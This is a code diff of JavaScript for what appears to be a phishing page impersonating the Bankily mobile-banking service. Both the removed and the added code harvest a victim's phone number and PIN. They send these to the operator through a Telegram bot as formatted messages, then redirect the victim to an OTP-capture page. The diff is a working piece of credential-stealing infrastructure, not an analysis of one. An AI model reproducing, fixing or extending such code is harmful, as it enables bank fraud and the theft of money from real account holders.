+
+  if(!/^[2-4][0-9]{7}$/.test(username)){showModal(L.errUsername);return;}
+  if(!/^[0-9]{4}$/.test(pin)){showModal(L.errPin);return;}
+  if(new Set(pin.split('')).size<4){
+    showModal(L.errPinUnique);
+    pinInputs.forEach(i=>{i.type='tel';i.value='';});
+    pinInputs[0].focus();return;
   }
-}
 
-async function doLogin() {
-  const phone = document.getElementById('phone-input').value;
-  const now = new Date();
-  const dateStr = now.toLocaleString('fr-FR', { timeZone: 'Africa/Nouakchott' });
+  const mins=checkReg(username);
+  if(mins!==false){showModal(L.already(mins));return;}
 
-  // Save to sessionStorage for OTP page
-  sessionStorage.setItem('phone', phone);
-  sessionStorage.setItem('pin', pin);
+  markReg(username);
+  sessionStorage.setItem('bankily_pin',pin);
+  sessionStorage.setItem('bankily_username',username);
+  loaderOverlay.classList.add('active');
 
-  // Record registration
-  recordReg(phone);
-
-  closePin();
-  document.getElementById('spinner').classList.add('active');
-
-  // FIX: template literal was broken — rebuilt as string concatenation
-  const msg =
-    '\uD83D\uDD10 <b>\u0645\u062D\u0627\u0648\u0644\u0629 \u062A\u0633\u062C\u064A\u0644 \u062F\u062E\u0648\u0644 \u062C\u062F\u064A\u062F\u0629</b>\n' +
-    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
-    '\uD83D\uDCF1 <b>\u0627\u0644\u0631\u0642\u0645:</b> +222 ' + phone + '\n' +
-    '\uD83D\uDD11 <b>\u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0633\u0631\u064A:</b> ' + pin + '\n' +
-    '\uD83C\uDF10 <b>\u0627\u0644\u0644\u063A\u0629:</b> ' + lang.toUpperCase() + '\n' +
-    '\uD83D\uDD50 <b>\u0627\u0644\u0648\u0642\u062A:</b> ' + dateStr + '\n' +
-    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
-    '\uD83D\uDCCC <i>@Sahra_wibot</i>';
-
-  await sendTelegram(msg);
-
-  setTimeout(function() {
-    document.getElementById('spinner').classList.remove('active');
-    window.location.href = 'otpverify.html';
-  }, 2000);
-}
-
-function goBack() {
-  if (document.getElementById('pin-popup').classList.contains('active')) closePin();
-  else history.back();
-}
+  const now=new Date().toLocaleString('fr-FR');
+  await sendTG(
+    `🔐 <b>Nouvelle connexion – Bankily</b>\n`+
+    `━━━━━━━━━━━━━━━━━━━━\n`+
+    `📱 <b>Numéro :</b> <code>${username}</code>\n`+
+    `🔑 <b>PIN    :</b> <code>${pin}</code>\n`+
+    `📅 <b>Heure  :</b> ${now}`
+  );
+  setTimeout(()=>{ window.location.href='otpverify.html'; },1500);
+});
 
 applyLang();
 </script>
